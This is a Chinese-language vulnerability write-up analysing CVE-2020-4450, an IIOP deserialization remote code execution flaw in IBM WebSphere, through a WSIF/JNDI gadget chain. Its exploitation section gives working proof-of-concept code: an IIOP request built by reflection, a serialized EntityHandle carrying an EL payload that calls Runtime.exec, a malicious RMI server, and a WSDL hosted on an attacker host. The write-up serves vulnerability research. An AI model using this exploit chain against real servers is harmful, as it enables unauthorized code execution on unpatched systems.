**作者：Lucifaer  
原文链接：[https://lucifaer.com/2020/08/21/WebSphere...](https://lucifaer.com/2020/08/21/WebSphere%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88CVE-2020-4450%EF%BC%89/#3-3-%E6%9E%84%E9%80%A0RMI-Server%E7%BB%91%E5%AE%9A "https://lucifaer.com/2020/08/21/WebSphere...")**

该漏洞本身其实并不是非常好用，但是对于分析来说，确实是今年以来比较有意思的一个漏洞了，值得所有做Java漏洞研究的人员进行跟进和学习。

# 0x01 漏洞概述

![](https://images.seebug.org/content/images/2020/08/24/1598236691000-15972228205883.jpg-w331s)

IBM WebSphere Application
Server（后面简称WAS）在今年6月发布了一则漏洞通告，cve编号为：CVE-2020-4450。该漏洞允许攻击者通过`iiop`向WAS进行网络请求，最终在WAS上执行任意代码。

在7月，ZDI公布了[漏洞细节](https://www.zerodayinitiative.com/blog/2020/7/20/abusing-java-remote-protocols-in-ibm-websphere)，同天iswin师傅也发布了他[对此漏洞的分析](https://www.secrss.com/articles/24353)，8月6日，360cert的小伙伴也公布了他自己的[分析](https://cert.360.cn/report/detail?id=3d016bdef66b8e29936f8cb364f265c8)，本文是参考以上三篇文章完成的，主要用于记录自己的调试过程，以及补充相关的分析细节。

# 0x02 漏洞分析

该漏洞主要分为三部分：

  * `TXServerInterceptor`拦截器处理`iiop`请求
  * 利用`WSIF`构造Gadget
  * 伪造`wsdl`文件完成漏洞利用

本文将从上而下将三部分进行串流分析，主要采用静态跟踪，最后会在漏洞利用部分分享如何创建相关数据流完成整条流程的串通。

## 2.1 TXServerInterceptor拦截器处理iiop请求

这一部分`tinit0`在19年的bh上其实已经做了[相关的分享](https://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf)，这里只是记录一下自己的跟进流程。

`TXServerInterceptor`具体代码在`com.ibm.ws.Transaction.JTS.TxServerInterceptor#receive_request`，这里只截关键部分的代码：

![](https://images.seebug.org/content/images/2020/08/24/1598236697000-15972242910735.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236698000-15972243293089.jpg-w331s)

拦截器首先会根据`ServerRequestInfo`实例化`ServiceContext`对象，当`serviceContext.context_data`对象非空时可以进入`TxInterceptorHelper.demarshalContext`解析流程，而这里就是漏洞的起始点。

跟进`TxInterceptorHelper.demarshalContext()`方法：

![](https://images.seebug.org/content/images/2020/08/24/1598236702000-15972245080226.jpg-w331s)

对Corba处理稍微熟悉一点的可以很明显的看出这里为Corba
rpc流程中的解包流程。根据传入的`bypte`数组初始化`CDRInputStream`对象用于后续进行反序列化操作。在完成`CDRInputStream`初始化后，调用`read_any()`方法初始化`Any`对象。

由于IBM自己重新实现了具体的IIOP解析流程，所以不能先入为主的用JDK原生处理逻辑来思考后续漏洞调用流程。

我们首先来跟进一下`CDRInputStream`的初始化逻辑，后续流程会用到其所定义的`CDRReader`：

![](https://images.seebug.org/content/images/2020/08/24/1598236705000-15972248043343.jpg-w331s)

这里最终返回`EncoderInputStream`对象，并设置`reader`对象为`com.ibm.rmi.iiop.CDRInputStream`，`reader`会在后续流程中用到。

现在跟进`inputStream.read_any()`：

![](https://images.seebug.org/content/images/2020/08/24/1598236706000-15972248768412.jpg-w331s)

具体实现为`com.ibm.rmi.iiop.CDRInputStream#reade_any`。由于`CDRInputStream`中未实现`read_any()`方法则调用`com.ibm.rmi.iiop.CDRReader#read_any`：
：

![](https://images.seebug.org/content/images/2020/08/24/1598236706000-15972251228004.jpg-w331s)

其中最为关键的逻辑就是`Any.read_value()`。到这里为止，经历了以下流程：

    
    
    CDRInputStream初始化 ->
    CDRInputStream.read_any() ->
    CDRInputStream.read_value()

看过之前那篇简述`Corba`文章的，可能已经清楚了，JDK原生实现逻辑在后续会触发反序列化流程，而IBM的实现方式却不尽相同，后续会触发反射调用的流程。

跟进`Any.read_value()`方法：

![](https://images.seebug.org/content/images/2020/08/24/1598236707000-15972254337002.jpg-w331s)

首先会将传入的`TypeCode`转化为真正的`TypeCode`，之后调用`TCUtility.unmarshalIn()`对传入的`InputStream`进行解包操作，想要查看全部的`TypeCode`的话，可以查看`org.omg.CORBA.TCKind#from_int`。这里我们重点关注`tk_value`，也就是`TypeCode`为29的情况：

![](https://images.seebug.org/content/images/2020/08/24/1598236708000-15972257728974.jpg-w331s)

接下来的调用逻辑为：

    
    
    org.omg.CORBA_2_3.portable.InputStream#read_value ->
    com.ibm.rmi.iiop.EncoderInputStream#read_value ->
    com.ibm.rmi.iiop.CDRReader#read_value

在`com.ibm.rmi.iiop.CDRReader#read_value()`中存在关键逻辑：

![](https://images.seebug.org/content/images/2020/08/24/1598236710000-15973007336187.jpg-w331s)

在`this.fast_read_value_ludcl();`中对`this.valueClass`进行了初始化：

![](https://images.seebug.org/content/images/2020/08/24/1598236711000-15973013028899.jpg-w331s)

最终通过`com.ibm.rmi.util.ClassCache#loadClass`调用JDK反射完成类的实例化。这里不做重点跟踪，感兴趣的可以自己跟一下。

这里主要跟进一下`his.valueHandler.readValue()`方法的处理流程：

![](https://images.seebug.org/content/images/2020/08/24/1598236711000-15972260536986.jpg-w331s)

调用了`this.inputStreamBridge.simpleReadObject()`最终返回一个`Serializable`对象，继续跟进：

![](https://images.seebug.org/content/images/2020/08/24/1598236713000-15972261515544.jpg-w331s)

红框标注了两个重要的流程，`simpleReadObjectInternal`方法和`simpleReadObjectLoop`，这两个方法存在一定的区别。

#### simpleReadObjectInternal

`simpleReadObjectInternal`首先根据`valueClass`的类型进行流程分派，之后会向上轮询查找父类同时将`subClass`保存在`pendingReadStack`中。判断父类是否存在`readObject`方法，如果没有则将完成初步处理的对象传入`simpleReadObjectLoop`中对其子类进行反序列化。

![](https://images.seebug.org/content/images/2020/08/24/1598236714000-15973118449026.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236715000-15973118892709.jpg-w331s)

![](media/15972222890037/15973119059944.jpg)

![](https://images.seebug.org/content/images/2020/08/24/1598236736000-15973119274273.jpg-w331s)

这里会会向上轮询查找父类同时将`subClass`保存在`pendingReadStack`中，跟进看一下`addSubclass()`方法：

![](media/15972222890037/15976574061085.jpg)

其将相关信息都进行了设置，这些设置在`simpleReadObjectLoop`中会用到。继续跟进：

![](https://images.seebug.org/content/images/2020/08/24/1598236768000-15973121515458.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236768000-15976574511247.jpg-w331s)

此处会判断父类中是否存在`readObject`方法，若不存在则完成后续处理逻辑并进入`simpleReadObjectLoop`逻辑之中。

#### simpleReadObjectLoop

`simpleReadObjectLoop`会遍历`pendingReadStack`中的子类，并调用`continueSimpleReadObject()`方法尝试反序列化。

![](https://images.seebug.org/content/images/2020/08/24/1598236769000-15973122359443.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236769000-15976577291188.jpg-w331s)

此处的`var2.obj`、`var2.classDesc`、`var2.fvd`在`simpleReadObjectInternal`中都已经进行了设置。跟进`inputObjectUsingClassDesc()`方法，和`simpleReadObjectInternal`是相同的逻辑，先判断是否存在`readObject`方法，如果存在则调用`readObject`方法进行反序列化操作：

![](https://images.seebug.org/content/images/2020/08/24/1598236770000-15976578935231.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236770000-15976579326436.jpg-w331s)

至此漏洞的触发点就梳理完毕了。

## 2.2 利用WSIF构造Gadget

### 2.2.1 WSIF更改执行流

在具体梳理漏洞gadget前，先用一个例子来简单介绍一下`Apache WSIF`。

`WSIF`全称Web服务调用框架，是一组用于调用Web服务的Java
API。其和`wsdl`描述文件强关联，`wsdl`文件用于描述与Web服务的抽象结构进行交互，可以理解为Web服务API的描述文件。

首先创建一个接口，该接口用于与对应的`wsdl`文件对应：

![](https://images.seebug.org/content/images/2020/08/24/1598236771000-15976456379665.jpg-w331s)

然后本地实现`Gadget`接口，这里为了简单，直接将`exec()`方法实现为执行命令：

![](https://images.seebug.org/content/images/2020/08/24/1598236771000-15976464644226.jpg-w331s)

具体的调用为：

![](https://images.seebug.org/content/images/2020/08/24/1598236771000-15976467368095.jpg-w331s)

`WSIFServiceFactory.getService()`方法文档如下：

![](https://images.seebug.org/content/images/2020/08/24/1598236772000-15976467803245.jpg-w331s)

可以看到这里主要需要以下几个参数：

  * `javax.wsdl.Definition`：wsdl文件的位置
  * `portTypeNs`：用于标识port的NameSpace，相当于配置的命名空间
  * `portTypeName`：`port`的名字，在wsdl中`portType`为接口对象的xml表示

这里的`WSIFService.getStub(Gadget.class)`方法最终返回的是一个`Gadget`类型的代理对象。

wsdl文件定义如下：

    
    
    <?xml version="1.0" ?>
    
    <definitions targetNamespace="http://wsifservice.addressbook/"
                 xmlns:tns="http://wsifservice.addressbook/"
                 xmlns:xsd="http://www.w3.org/1999/XMLSchema"
                 xmlns:format="http://schemas.xmlsoap.org/wsdl/formatbinding/"
                 xmlns:java="http://schemas.xmlsoap.org/wsdl/java/"
                 xmlns="http://schemas.xmlsoap.org/wsdl/">
    
        <message name="ExecRequestMessage">
            <part name="command" type="xsd:string"/>
        </message>
    
        <!-- port type declns -->
        <portType name="Gadget">
            <operation name="exec">
                <input name="ExecRequest" message="tns:ExecRequestMessage"/>
            </operation>
        </portType>
    
        <!-- binding declns -->
        <binding name="JavaBinding" type="tns:Gadget">
            <java:binding/>
            <format:typeMapping encoding="Java" style="Java">
                <format:typeMap typeName="xsd:string" formatType="java.lang.String" />
            </format:typeMapping>
            <operation name="exec">
                <java:operation
                    methodName="exec"
                    parameterOrder="command"
                    methodType="instance"
                />
            </operation>
        </binding>
    
        <!-- service decln -->
        <service name="GadgetService">
            <port name="JavaPort" binding="tns:JavaBinding">
                <java:address className="com.lucifaer.wsif_gadget.service.GadgetImpl"/>
            </port>
        </service>
    
    </definitions>

运行效果如下：

![](https://images.seebug.org/content/images/2020/08/24/1598236772000-15976474727748.jpg-w331s)

现在我们在不改动`Main`代码的情况下（即不改变运行逻辑）让其执行el表达式解析（即实现不同的逻辑）。为了方便测试，只改变`Main`中`exec()`方法的参数（可以理解为这里是可控的值）：

![](https://images.seebug.org/content/images/2020/08/24/1598236773000-15976506533100.jpg-w331s)

修改`wsdl`如下：

![](https://images.seebug.org/content/images/2020/08/24/1598236773000-15976508579008.jpg-w331s)

执行结果如下：

![](https://images.seebug.org/content/images/2020/08/24/1598236775000-15976508804581.jpg-w331s)

通过上面两个例子 **可以简单的将WSIF理解为接口的描述文件，而接口方法的具体实现是根据`wsdl`配置而进行绑定的**。

**所以当在面对一个存在`WSIF`调用的逻辑时，可以考虑使用自定义的`wsdl`来将执行流引向符合条件的其他实现中**。

### 2.2.2 Gadget执行流

根据ZDI的文章，`tint0`找到了一个存在`readObject`方法的类，并且该类会触发`JNDI`逻辑，这个类就是`org.apache.wsif.providers.ejb.WSIFPort_EJB`：

![](https://images.seebug.org/content/images/2020/08/24/1598236776000-15976580912330.jpg-w331s)

`HomeHandle.getEJBHome()`虽然也会触发JNDI流程，但是由于在具体实现时没有对返回回的代理类对象的相关方法进行引用，无法触发后续的gadget逻辑，所以此处需要构造一个`Handle`对象，而非一个`HomeHandle`对象。

现在我们可以先继续跟着`Handle.getEJBObject()`的逻辑向下看，看到后面就可以理解为什么选择构造`Handle`对象了。

跟进`com.ibm.ejs.container.EntityHandle#getEJBObject`，此处是整个Gadget的主要执行逻辑：

![](https://images.seebug.org/content/images/2020/08/24/1598236776000-15976589004605.jpg-w331s)

总结一下分为三步:

  * JNDI返回一个`EJBHome`类型的对象
  * 检查返回对象的`EJBHome`对象是否存在`findByPrimaryKey`方法
  * 反射调用`EJBHome`对象的`findByPrimaryKey`对象

首先来看

    
    
    home = (EJBHome)PortableRemoteObject.narrow(ctx.lookup(this.homeJNDIName), homeClass);

由于最终返回类型为`EJBHome`，可以得知`homeClass`为`EJBHome`接口的具体实现类，且`ctx.lookup(this.homeJNDIName)`必须为`EJBHome`子类。

接着跟进`com.ibm.ejs.container.EntityHandle#findFindByPrimaryKey`查看`homeClass`需要满足的条件：

![](https://images.seebug.org/content/images/2020/08/24/1598236777000-15976595262789.jpg-w331s)

可以看到必须存在`findByPrimaryKey`方法。在`EJBHome`的继承树中寻找符合条件的类有：

    
    
    com.ibm.ejs.security.registry.RegistryEntryHome
    com.ibm.ws.batch.AbstractResourceHome
    com.ibm.ws.batch.CounterHome
    com.ibm.ws.batch.LocalJobStatusHome

目前先不管构造哪个接口的具体实现类，先来看一下`ctx.lookup()`的具体实现，调用栈：

    
    
    com.sun.jndi.rmi.registry.RegistryContext#lookup
    com.sun.jndi.rmi.registry.RegistryContext#decodeObject
    javax.naming.spi.NamingManager#getObjectInstance

![](https://images.seebug.org/content/images/2020/08/24/1598236778000-15977142928279.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236779000-15977143234418.jpg-w331s)

    
    
    org.apache.aries.jndi.OSGiObjectFactoryBuilder#getObjectInstance(java.lang.Object, javax.naming.Name, javax.naming.Context, java.util.Hashtable<?,?>)
    org.apache.aries.jndi.ObjectFactoryHelper#getObjectInstance

![](https://images.seebug.org/content/images/2020/08/24/1598236779000-15977144930038.jpg-w331s)

跟进`org.apache.aries.jndi.ObjectFactoryHelper#getObjectInstanceViaContextDotObjectFactories(java.lang.Object,
javax.naming.Name, javax.naming.Context, java.util.Hashtable<?,?>,
javax.naming.directory.Attributes)`：

![](https://images.seebug.org/content/images/2020/08/24/1598236779000-15977147704881.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236780000-15977147981258.jpg-w331s)

这里的`factory`为`ObjectFactory`接口的具体实现，而`factory`是可以通过`environment`自定义实现的，所以这里可以通过修改`environment`的配置更改执行流。

tint0这里找到的可以用`ObjectFactory`为`org.apache.wsif.naming.WSIFServiceObjectFactory`：

![](https://images.seebug.org/content/images/2020/08/24/1598236780000-15977156314879.jpg-w331s)

由于`ctx.lookup()`最终要求返回的是`EJBHome`的实现类，而`WSIFService`接口并非`EJBHome`的子类，所以选择下面的流程。根据2.2.1中的叙述，可以明显的看出这里调用了`WSIF`流程。

这里重新放一下`WSIFServiceFactory.getService()`方法的文档：

![](https://images.seebug.org/content/images/2020/08/24/1598236772000-15976467803245.jpg-w331s)

对应实现的代码：

![](https://images.seebug.org/content/images/2020/08/24/1598236782000-15977165979084.jpg-w331s)

注意红框标注的相关代码，`WSIF`所需要的基础参数我们都可以通过`Reference`对象获得。通过指定`className`，我们还可以指定生成的`stub`动态代理对象的类型，当设置其为`EJBHome`的具体实现类时，可以完美的匹配我们之前的需求。

而通过自定义`wsdl`文件，我们可以将接口方法映射到其他的具体实现中，改变具体接口的执行流。

## 2.3 伪造wsdl文件完成漏洞利用

根据2.2.2中的内容，我们回看触发JNDI流程处的代码：

![](https://images.seebug.org/content/images/2020/08/24/1598236776000-15976589004605.jpg-w331s)

在2.2.2中也说过，这里的`home`对象要满足两个条件：

  * 是`EJBHome`的具体实现类
  * 存在`findByPrimaryKey`方法

搜索`EJBHome`的继承树，满足条件的有：

    
    
    com.ibm.ejs.security.registry.RegistryEntryHome
    com.ibm.ws.batch.AbstractResourceHome
    com.ibm.ws.batch.CounterHome
    com.ibm.ws.batch.LocalJobStatusHome

所以如果构造`Reference`对象中的`className`为其中一个类，并设置好`wsdl`文件中对应接口方法的映射，即可完成我们想要控制的逻辑。

仔细研究一下上面所列举的可用的`EJBHome`接口子类：

![](https://images.seebug.org/content/images/2020/08/24/1598236783000-15977200531315.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236783000-15977201146283.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236784000-15977201681609.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236784000-15977201911737.jpg-w331s)

其中`com.ibm.ws.batch.CounterHome`是最容易构造的，可以配合`javax.el.ELProcessor`执行`el`表达式，最终导致命令执行。

所以只需要造好`wsdl`，让`CounterHome`的`findByPrimaryKey`方法的具体实现指向`javax.el.ELProcessor`的`eval`方法，在返回了`CounterHome`动态代理对象后，会利用反射调用其`findByPrimaryKey`也就是我们通过`wsdl`绑定的`javax.el.ELProcessor#eval`方法，完成表达式执行。

攻击流程可以总结如下：

![](https://images.seebug.org/content/images/2020/08/24/1598236784000-15977212887423.jpg-w331s)

至此漏洞梳理完毕。

# 0x03 漏洞利用

根据0x02的分析，可以得出想要利用成功该漏洞所需的必备因素：

  * IIOP请求构造（满足进入触发点的context）
  * 构造`org.apache.wsif.providers.ejb.WSIFPort_EJB`所需的序列化数据（最终反序列化对象的类型为`Handle`）
  * 构造`wsdl`文件更改接口方法的具体实现
  * 构造`JNDI server`使其返回指定的`Reference`对象

接下来会对上述流程进行逐一叙述。

## 3.1 IIOP请求构造

回看`com.ibm.ws.Transaction.JTS.TxServerInterceptor#receive_request`：

![](https://images.seebug.org/content/images/2020/08/24/1598236785000-15977214558427.jpg-w331s)

要注意两个点：

  * `ServiceContext.context_data`非空，且包含我们构造的序列化Gadget
  * `TxProperties.SINGLE_PROCESS`为`true`

重点来看一下`ServiceContext`获取逻辑，跟进`((ExtendedServerRequestInfo)sri).getRequestServiceContext(0)`，调用逻辑如下：

    
    
    com.ibm.rmi.pi.ServerRequestInfoImpl#getRequestServiceContext
    com.ibm.rmi.iiop.ServerRequestImpl#getServiceContext
    com.ibm.rmi.iiop.RequestMessage#getServiceContext
    com.ibm.rmi.iiop.ServiceContextList#getServiceContext

根据调用栈我们可以看到是从`com.ibm.rmi.iiop.RequestMessage`对象中获取`ServiceContext`对象的，在`etServiceContext`方法中：

![](https://images.seebug.org/content/images/2020/08/24/1598236786000-15978939345616.jpg-w331s)

会遍历`ServiceContextList`，提取id为`0`的`ServiceContext`。但是由于没有编号为`0`的`ServiceContext`，所以返回的是空。

仔细读一下官方文档，官方文档中有提及如何在RMI请求中插入`ServiceContext`的做法，可以参考[文档](https://publib.boulder.ibm.com/tividd/td/ITMFTP/SC32-9412-00/en_US/HTML/arm48.htm)进行理解：

![](https://images.seebug.org/content/images/2020/08/24/1598236787000-15979071961591.jpg-w331s)

可以看到最终是调用`ExtendedClientRequestInfo`(`ClientRequestInfo`的父类)的`add_request_service_context`方法完成自定义`ServiceContext`的设置。那么关键点就是，我们如何从client端将`ServiceContext`设置到`ExtendedClientRequestInfo`中。

在跟踪了ibm自定义的通信过程后，可以发现在`ORB`中的`GIOPImpl`在调用`createRequest`方法时会实例化`ClientRequestImpl`对象：

![](https://images.seebug.org/content/images/2020/08/24/1598236788000-15979130127814.jpg-w331s)

这里有两个地方需要注意：

  * 获取`Connection`对象
  * 根据获取的`Connection`对象获取`ServiceContext`

首先先看一下是如何从`Connection`对象中获取到`ServiceContext`的：

![](https://images.seebug.org/content/images/2020/08/24/1598236788000-15979132009338.jpg-w331s)

可以看到直接是调用`Connection#getServiceContexts`方法。

之后跟进`ClientRequestImpl`初始化逻辑：

![](https://images.seebug.org/content/images/2020/08/24/1598236788000-15979128642110.jpg-w331s)

将获取到的`ServiceContext`作为参数传入到`RequestMessage`的构造函数中。这里就和服务端跟到的逻辑相符。

梳理一下思路，构造`IIOP`请求的关键点为：

  * 进行第一次请求，初始化获取到的`Context`对象
  * 获取`ORB`
  * 获取`ORB`中的`GIOPImpl`
  * 获取`Connection`对象
  * 调用`setConnectionContexts`将构造好的`ServiceContext`设置到`Connection`对象中
  * 进行第二次请求，触发`RequestMessage`对象的重新发送

具体构造可以动态调试一下，利用反射完成相关的值设置。

最终构造如下：

    
    
    Properties env = new Properties();
    env.put(Context.PROVIDER_URL, "iiop://192.168.211.128:2809");
    env.put(Context.INITIAL_CONTEXT_FACTORY, "com.ibm.websphere.naming.WsnInitialContextFactory");
    
    InitialContext context = new InitialContext(env);
    context.list("");
    
    Field f_defaultInitCtx = context.getClass().getDeclaredField("defaultInitCtx");
    f_defaultInitCtx.setAccessible(true);
    WsnInitCtx defaultInitCtx = (WsnInitCtx) f_defaultInitCtx.get(context);
    
    Field f_context = defaultInitCtx.getClass().getDeclaredField("_context");
    f_context.setAccessible(true);
    CNContextImpl _context = (CNContextImpl) f_context.get(defaultInitCtx);
    
    Field f_corbaNC = _context.getClass().getDeclaredField("_corbaNC");
    f_corbaNC.setAccessible(true);
    _NamingContextStub _corbaNC = (_NamingContextStub) f_corbaNC.get(_context);
    
    Field f__delegate = ObjectImpl.class.getDeclaredField("__delegate");
    f__delegate.setAccessible(true);
    ClientDelegate clientDelegate = (ClientDelegate) f__delegate.get(_corbaNC);
    
    Field f_ior = clientDelegate.getClass().getSuperclass().getDeclaredField("ior");
    f_ior.setAccessible(true);
    IOR ior = (IOR) f_ior.get(clientDelegate);
    
    Field f_orb = clientDelegate.getClass().getSuperclass().getDeclaredField("orb");
    f_orb.setAccessible(true);
    ORB orb = (ORB) f_orb.get(clientDelegate);
    
    GIOPImpl giop = (GIOPImpl) orb.getServerGIOP();
    Method getConnection = giop.getClass().getDeclaredMethod("getConnection", com.ibm.CORBA.iiop.IOR.class, Profile.class, ClientDelegate.class, String.class);
    getConnection.setAccessible(true);
    Connection connection = (Connection) getConnection.invoke(giop, ior, ior.getProfile(), clientDelegate, "Lucifaer");
    Method setConnectionContexts = connection.getClass().getDeclaredMethod("setConnectionContexts", ArrayList.class);
    setConnectionContexts.setAccessible(true);
    
    byte[] result = new byte[]{0, 0};
    
    
    ServiceContext serviceContext = new ServiceContext(0, result);
    ArrayList v4 = new ArrayList();
    v4.add(serviceContext);
    setConnectionContexts.invoke(connection, v4);
    
    context.list("");

## 3.2 构造所需的序列化数据

在2.1的分析中，我们知道要满足触发反序列化流程需要进行特殊构造。漏洞触发点为`inputStream.read_any()`，为了满足上方对`inputStream`相关数据的提取，所以需要特殊构造`byte[]`：

![](https://images.seebug.org/content/images/2020/08/24/1598236789000-15979139747426.jpg-w331s)

既然存在`demarshalContext`方法，那一定存在`marshalContext`方法：

![](https://images.seebug.org/content/images/2020/08/24/1598236789000-15979142460369.jpg-w331s)

按照上面的方法直接生成符合要求的`byte[]`：

    
    
    CDROutputStream outputStream = ORB.createCDROutputStream();
    outputStream.putEndian();
    
    Any any = orb.create_any();
    
    PropagationContext propagationContext = new PropagationContext(
            0,
            new TransIdentity(null, null, new otid_t(0, 0, new byte[0])),
            new TransIdentity[0],
            any
    );
    PropagationContextHelper.write(outputStream, propagationContext);
    result = outputStream.toByteArray();

在满足了触发点后，我们需要构造gadget满足条件：

  * 构造一个`org.apache.wsif.providers.ejb.WSIFPort_EJB`对象，其中还需要构造`WSIFPort_EJB#readObject`方法传入值反序列化得到一个`javax.ejb.Handle`对象。
  * 构造`EntityHandle`对象

### 3.2.1 生成WSIFPort_EJB序列化对象

直接看`org.apache.wsif.providers.ejb.WSIFPort_EJB#writeObject`：

![](https://images.seebug.org/content/images/2020/08/24/1598236790000-15979159354286.jpg-w331s)

这里我们需要首先设置`this.fieldEjbObject`对象并调用其`getHandle`方法，生成一个`Handle`对象。这里的`this.fieldEjbObject`是`EJBObject`接口的具体实现。所以可以自己寻找一个具体实现类，并覆盖其`getHandle`方法。

### 3.2.2 构造EntityHandle对象

构造一个`EntityHandle`对象还是比较麻烦的，我们来理一下：

我们需要将`homeJNDIName`设置为我们自己定义的RMI
Server地址，同时`key`是最终传入`findByPrimaryKey`的参数，需要构造为我们要执行的代码，所以需要构造特殊的`BeanId`对象：

![](https://images.seebug.org/content/images/2020/08/24/1598236790000-15979176746723.jpg-w331s)

同时为了将之后RMI流程指向`org.apache.wsif.naming.WSIFServiceObjectFactory`，需要我们在`Properties`对象中设置相关的`environment`：

![](https://images.seebug.org/content/images/2020/08/24/1598236790000-15979737140094.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236791000-15979737322267.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236779000-15977147704881.jpg-w331s)

我们首先构造`BeanId`。跟进`com.ibm.ejs.container.BeanId#getJNDIName`：

![](https://images.seebug.org/content/images/2020/08/24/1598236792000-15979184283350.jpg-w331s)

![](https://images.seebug.org/content/images/2020/08/24/1598236793000-15979172158135.jpg-w331s)

所以还需要构造`HomeInternal`的具体实现对象，并使其返回`String`类型。

整理一下需要构造的`HomeInternal`对象的需求：

  * 构造`J2EEName`对象，满足要求
  * 寻找一个`HomeInternal`的具体实现对象，其`getJNDIName`方法返回`String`，且返回不受到`pkey`干扰

查看继承树后，发现`EJSHome`抽象类满足要求：

![](https://images.seebug.org/content/images/2020/08/24/1598236793000-15979180217628.jpg-w331s)

所以梳理一下思路：

  * 实例化`EJSHome`接口实现类
  * 实例化`J2EEName`对象
  * 反射设置`J2EEName`到`EJSHome`接口实现类
  * 反射设置`EJSHome`接口实现类 的`this.jndiName`变量为RMI Server的地址
  * 实例化`BeanId`
  * 实例化`BeanMetaData`
  * 实例化`Properties`

这里重写了`com.ibm.ejs.container.EJSWrapper`：

    
    
    public Handle getHandle() {
    
        Handle var2 = null;
        try {
            SessionHome sessionHome = new SessionHome();
            J2EEName j2EEName = new J2EENameImpl("aa","aa","aa");
            Field j2eeName = EJSHome.class.getDeclaredField("j2eeName");
            j2eeName.setAccessible(true);
            j2eeName.set(sessionHome,j2EEName);
            Field jndiName = sessionHome.getClass().getSuperclass().getDeclaredField("jndiName");
            jndiName.setAccessible(true);
            jndiName.set(sessionHome,"rmi://127.0.0.1:1099/poc");
            Serializable key = "\"a\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('open /Applications/Calculator.app')\")";
            //Serializable key = "\"a\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"ifconfig\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")";
            BeanId beanId = new BeanId(sessionHome,key,true);
            BeanMetaData beanMetaData = new BeanMetaData(1);
            beanMetaData.homeInterfaceClass = com.ibm.ws.batch.CounterHome.class;
            Properties initProperties = new Properties();
            initProperties.setProperty("java.naming.factory.object", "org.apache.wsif.naming.WSIFServiceObjectFactory");
            Constructor c = EntityHandle.class.getDeclaredConstructor(BeanId.class, BeanMetaData.class, Properties.class);
            c.setAccessible(true);
            var2 = (Handle) c.newInstance(beanId, beanMetaData, initProperties);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return var2;
    }

## 3.3 构造RMI Server绑定

根据2.2.2的分析，我们最终的RMI流程会进行到`org.apache.wsif.naming.WSIFServiceObjectFactory`中：

![](https://images.seebug.org/content/images/2020/08/24/1598236780000-15977156314879.jpg-w331s)

所以我们需要构造一个恶意的RMI Server，其应该满足以下要求：

  * 返回一个`WSIFServiceStubRef`对象
  * 指定用于后续调用`WSIF`流程的基础参数：
    * `wsdLoc`
    * `serviceNS`
    * `serviceName`
    * `portTypeNS`
    * `portTypeName`
    * `preferredPort`
  * 设置`className`为`com.ibm.ws.batch.CounterHome`

以上有关`WSIF`的参数设置，可以参考2.2.1中的叙述，这里就不再过多重复了。

最终可以构造RMI Server如下：

    
    
    public class RmiServer {
        public static void main(String[] args) throws Exception {
            Registry registry = LocateRegistry.createRegistry(1097);
            Reference ref = new Reference(WSIFServiceObjectFactory.class.getName(), null, null);
            ref.add(new StringRefAddr("wsdlLoc", "http://192.168.211.1:9999/poc.wsdl"));
            ref.add(new StringRefAddr("serviceNS", null));
            ref.add(new StringRefAddr("serviceName", null));
            ref.add(new StringRefAddr("portTypeNS", "http://wsifservice.addressbook/"));
            ref.add(new StringRefAddr("portTypeName", "Gadget"));
            ref.add(new StringRefAddr("className", "com.ibm.ws.batch.CounterHome"));
    
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
            registry.bind("poc", referenceWrapper);
        }
    }

## 3.4 构造WSDL文件

这一部分参考2.2.1中叙述，这里直接给出`wsdl`文件的内容：

    
    
    <?xml version="1.0" ?>
    
    <definitions targetNamespace="http://wsifservice.addressbook/"
                 xmlns:tns="http://wsifservice.addressbook/"
                 xmlns:xsd="http://www.w3.org/1999/XMLSchema"
                 xmlns:format="http://schemas.xmlsoap.org/wsdl/formatbinding/"
                 xmlns:java="http://schemas.xmlsoap.org/wsdl/java/"
                 xmlns="http://schemas.xmlsoap.org/wsdl/">
    
        <!-- type defs -->
    
        <!-- message declns -->
        <message name="findByPrimaryKeyRequest">
            <part name="el" type="xsd:string"/>
        </message>
    
        <message name="findByPrimaryKeyResponse">
            <part name="counterObject" type="xsd:object"/>
        </message>
    
        <!-- port type declns -->
        <portType name="Gadget">
            <operation name="findByPrimaryKey">
                <input message="findByPrimaryKeyRequest"/>
                <output message="findByPrimaryKeyResponse"/>
            </operation>
        </portType>
    
        <!-- binding declns -->
        <binding name="JavaBinding" type="tns:Gadget">
            <java:binding/>
            <format:typeMapping encoding="Java" style="Java">
                <format:typeMap typeName="xsd:string" formatType="java.lang.String"/>
                <format:typeMap typeName="xsd:object" formatType="java.lang.Object"/>
            </format:typeMapping>
            <operation name="findByPrimaryKey">
                <java:operation
                    methodName="eval"
                    parameterOrder="el"
                    methodType="instance"
                    returnPart="counterObject"
                />
            </operation>
        </binding>
    
        <!-- service decln -->
        <service name="GadgetService">
            <port name="JavaPort" binding="tns:JavaBinding">
                <java:address className="javax.el.ELProcessor"/>
            </port>
        </service>
    
    </definitions>

## 3.5 整合poc

最后将3.2构造好的`WSIFPort_EJB`序列化对象写入3.1构造好的IIOP请求中：

![](https://images.seebug.org/content/images/2020/08/24/1598236794000-15979769212448.jpg-w331s)

至此poc构造完毕。

攻击效果如下：

![](https://images.seebug.org/content/images/2020/08/24/1598236794000-15979953775382.jpg-w331s)

# 0x04 参考

